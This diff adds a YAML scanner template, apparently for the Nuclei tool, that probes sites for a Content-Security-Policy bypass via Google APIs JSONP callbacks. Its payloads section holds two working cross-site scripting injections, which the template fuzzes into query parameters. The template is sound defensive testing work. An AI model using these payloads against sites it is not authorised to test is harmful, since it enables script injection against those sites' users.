@@ -1,0 +1,40 @@
+id: google-apis-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass via Google APIs
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-apis
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_apis_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<iframe id=x src="/%GG"></iframe><script src="https://apis.google.com/complete/search?client=chrome&q=<script>alert(document.domain)</script>&callback=x.contentDocument.write"></script>'
+        - '<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_apis_csp_xss == true"
+# digest: 4b0a00483046022100a4b52b0225366f9b28927a2bd2a8e2e9eec9164bc30ac4c9a482faead9ac63050221009207fff2fc8602b8508c1557b0a9927f931facd55c7dfecf665090c9086abfa8:922c64590222798bb761d5b6d8e72950
